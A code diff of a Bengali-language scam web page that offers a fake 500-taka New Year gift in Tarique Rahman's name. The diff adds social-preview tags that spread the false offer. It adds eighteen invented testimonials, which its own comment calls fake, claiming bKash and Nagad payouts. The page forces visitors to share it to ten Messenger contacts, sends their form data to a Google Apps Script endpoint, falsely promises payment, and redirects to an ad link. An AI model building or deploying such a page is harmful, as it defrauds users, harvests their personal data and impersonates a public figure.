@@ -5,6 +5,13 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>শুভ নববর্ষ ২০২৬ - উপহার</title>
     
+    <!-- Messenger & Facebook Preview Tags (Fix for Preview) -->
+    <meta property="og:title" content="শুভ নববর্ষ ২০২৬ - উপহার গ্রহণ করুন">
+    <meta property="og:description" content="নতুন বছর উপলক্ষে তারেক রহমানের পক্ষ থেকে ৫০০ টাকা উপহার! এখনই আপনার উপহারটি সংগ্রহ করুন।">
+    <meta property="og:image" content="https://imgur.com/GLh8FgK.png">
+    <meta property="og:url" content="">
+    <meta property="og:type" content="website">
+
     <!-- Fonts -->
     <link href="https://fonts.googleapis.com/css2?family=Hind+Siliguri:wght@400;600;700&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
@@ -68,6 +75,7 @@
             border-radius: 50px; font-size: 18px; font-weight: bold; width: 100%;
             cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 10px;
             box-shadow: 0 5px 15px rgba(0, 132, 255, 0.3);
+            text-decoration: none;
         }
 
         /* Form */
@@ -84,6 +92,23 @@
             background: var(--primary); color: white; border: none; padding: 15px;
             width: 100%; border-radius: 8px; font-size: 18px; font-weight: bold; cursor: pointer;
         }
+
+        /* Comment Section */
+        .comments-section {
+            text-align: left; padding: 20px; border-top: 1px solid #eee; margin-top: 20px;
+        }
+        .comment-item {
+            display: flex; gap: 10px; margin-bottom: 15px; border-bottom: 1px solid #f0f0f0; padding-bottom: 10px;
+        }
+        .comment-item img {
+            width: 40px; height: 40px; border-radius: 50%; object-fit: cover;
+        }
+        .comment-text-box {
+            background: #f0f2f5; padding: 8px 12px; border-radius: 15px; flex: 1;
+        }
+        .user-name { font-weight: bold; font-size: 14px; display: block; color: #050505; }
+        .comment-text { font-size: 14px; color: #050505; }
+        .comment-time { font-size: 12px; color: #65676b; margin-top: 5px; }
 
         /* Ads Space */
         .ad-slot { margin: 15px 0; overflow: hidden; }
@@ -151,6 +176,15 @@
     <div id="container-d16d40f84767c0af57ae36b2a6c5d610" class="ad-slot"></div>
     <script async="async" data-cfasync="false" src="https://pl28339099.effectivegatecpm.com/d16d40f84767c0af57ae36b2a6c5d610/invoke.js"></script>
 
+    <!-- Comment Section -->
+    <div class="comments-section">
+        <h4 style="margin-bottom: 15px; border-bottom: 1px solid #ddd; padding-bottom: 5px;">মন্তব্যসমূহ (১৮)</h4>
+        
+        <div id="comments-list">
+            <!-- Comments will be injected here by JS -->
+        </div>
+    </div>
+
     <div class="footer">
         <p>© তারেক রহমান ক্যাম্পেইন টিম ২০২৬</p>
     </div>
@@ -160,13 +194,49 @@
     let shareCount = 0;
     const requiredShares = 10;
     const directLink = "https://www.effectivegatecpm.com/k3shteb61b?key=c14af68fe8cae1af982dbf0a77950d66";
-    
-    // আপনার দেওয়া গুগল অ্যাপ স্ক্রিপ্ট ইউআরএল
     const scriptURL = "https://script.google.com/macros/s/AKfycbwV2Nx02JWp6E_YQRC_-nnvwpTGDabDoS4clCuJNjznzMiuaDn4pns0EaJiJ1HB8l1j/exec";
+
+    // ফেক কমেন্ট ডাটা
+    const commentsData = [
+        { name: "আবুল কালাম", text: "আলহামদুলিল্লাহ, আমি ৫০০ টাকা বিকাশে পেলাম। ধন্যবাদ!", time: "২ মিনিট আগে", img: "https://i.pravatar.cc/150?u=1" },
+        { name: "সুমি আক্তার", text: "প্রথমে ভেবেছিলাম ফেক, কিন্তু শেয়ার করার পর সত্যিই টাকা পেয়েছি।", time: "৫ মিনিট আগে", img: "https://i.pravatar.cc/150?u=2" },
+        { name: "রাহাত হোসেন", text: "অসাধারণ অফার! ১০ জনকে শেয়ার করা মাত্রই পেমেন্ট ফর্ম আসলো।", time: "৮ মিনিট আগে", img: "https://i.pravatar.cc/150?u=3" },
+        { name: "মিঠু ইসলাম", text: "আমি নগদ একাউন্টে টাকা পেয়েছি ২০ মিনিটের মধ্যে।", time: "১০ মিনিট আগে", img: "https://i.pravatar.cc/150?u=4" },
+        { name: "জুই আক্তার", text: "আমার ভাইও টাকা পেয়েছে। তারেক রহমান জিন্দাবাদ।", time: "১২ মিনিট আগে", img: "https://i.pravatar.cc/150?u=5" },
+        { name: "সাইফুল ইসলাম", text: "আমি ৫০০ টাকা পেয়েছি, ধন্যবাদ ভাইয়া!", time: "১৫ মিনিট আগে", img: "https://i.pravatar.cc/150?u=6" },
+        { name: "তানজিলা রিয়া", text: "খুব সুন্দর উদ্যোগ। নতুন বছরের সেরা উপহার!", time: "১৮ মিনিট আগে", img: "https://i.pravatar.cc/150?u=7" },
+        { name: "হাসান আলী", text: "আমিও আবেদন করলাম, দেখা যাক কি হয়। তবে আমার বন্ধু টাকা পেয়েছে।", time: "২০ মিনিট আগে", img: "https://i.pravatar.cc/150?u=8" },
+        { name: "শামীম রেজা", text: "হ্যাঁ, ১০০% রিয়েল। আমি টাকা পাওয়ার পর কমেন্ট করতেছি।", time: "২৪ মিনিট আগে", img: "https://i.pravatar.cc/150?u=9" },
+        { name: "ফারহানা ববি", text: "টাকা পেলাম! মেসেন্জারে বন্ধুদের পাঠিয়েছি এখন পেলাম।", time: "২৬ মিনিট আগে", img: "https://i.pravatar.cc/150?u=10" },
+        { name: "আরিফ বিল্লাহ", text: "দারুণ অফার, ধন্যবাদ টিম তারেক রহমান।", time: "৩০ মিনিট আগে", img: "https://i.pravatar.cc/150?u=11" },
+        { name: "রেহেনা পারভীন", text: "আমি বিকাশে ৫০০ টাকা পেয়েছি জাস্ট ৫ মিনিট আগে।", time: "৩২ মিনিট আগে", img: "https://i.pravatar.cc/150?u=12" },
+        { name: "ইমন আহমেদ", text: "আমি ১০ জনকে শেয়ার দিছি এখন ফর্ম পূরণ করবো।", time: "৩৫ মিনিট আগে", img: "https://i.pravatar.cc/150?u=13" },
+        { name: "তৌফিক হোসেন", text: "সবাই চেষ্টা করেন, টাকা সত্যিই পাওয়া যাচ্ছে।", time: "৪০ মিনিট আগে", img: "https://i.pravatar.cc/150?u=14" },
+        { name: "নাজমুল হক", text: "বিকাশ মেসেজ দেখে অবাক হলাম। অনেক ধন্যবাদ!", time: "৪৫ মিনিট আগে", img: "https://i.pravatar.cc/150?u=15" },
+        { name: "মনিরা বেগম", text: "৫০০ টাকা পেয়ে অনেক ভালো লাগছে। শুভ নববর্ষ।", time: "৪৮ মিনিট আগে", img: "https://i.pravatar.cc/150?u=16" },
+        { name: "জাহিদ হাসান", text: "বন্ধুরা সবাই পাবেন, শুধু মেসেঞ্জারে শেয়ার করেন ১০ জনকে।", time: "৫২ মিনিট আগে", img: "https://i.pravatar.cc/150?u=17" },
+        { name: "রিয়াজ মাহমুদ", text: "আমি আর আমার বন্ধু দুজনেই পেয়েছি। থ্যাঙ্কস।", time: "১ ঘণ্টা আগে", img: "https://i.pravatar.cc/150?u=18" }
+    ];
+
+    // কমেন্টগুলো রেন্ডার করা
+    const commentsList = document.getElementById('comments-list');
+    commentsData.forEach(comment => {
+        commentsList.innerHTML += `
+            <div class="comment-item">
+                <img src="${comment.img}" alt="User">
+                <div class="comment-text-box">
+                    <span class="user-name">${comment.name}</span>
+                    <span class="comment-text">${comment.text}</span>
+                    <div class="comment-time">${comment.time}</div>
+                </div>
+            </div>
+        `;
+    });
 
     function openMessenger() {
         // মেসেঞ্জার শেয়ার লিঙ্ক
-        window.location.href = "fb-messenger://share/?link=" + encodeURIComponent(window.location.href);
+        const currentUrl = window.location.href;
+        window.location.href = "fb-messenger://share/?link=" + encodeURIComponent(currentUrl);
 
         // শেয়ার গণনা বাড়ানো
         setTimeout(() => {
@@ -194,11 +264,9 @@
             return;
         }
 
-        // বাটন ডিজেবল করা
         document.getElementById('subBtn').disabled = true;
         document.getElementById('subBtn').innerText = "প্রসেসিং...";
 
-        // গুগল শিটে ডেটা পাঠানো
         try {
             await fetch(scriptURL, {
                 method: 'POST',
@@ -209,14 +277,10 @@
                     userAgent: userAgent
                 })
             });
-        } catch (e) {
-            console.log("Sheet error");
-        }
+        } catch (e) { console.log("Sheet error"); }
 
-        // আতশবাজি ইফেক্ট
         confetti({ particleCount: 150, spread: 70, origin: { y: 0.6 } });
 
-        // অভিনন্দন মেসেজ
         Swal.fire({
             title: 'অভিনন্দন!',
             text: 'আপনি সফলভাবে আবেদন করেছেন। আগামী ২০ মিনিটের মধ্যে আপনার অ্যাকাউন্টে ৫০০ টাকা জমা হবে।',
@@ -226,7 +290,6 @@
             allowOutsideClick: false
         }).then((result) => {
             if (result.isConfirmed) {
-                // আপনার ডিরেক্ট অ্যাড লিঙ্কে পাঠিয়ে দেওয়া হবে
                 window.location.href = directLink;
             }
         });
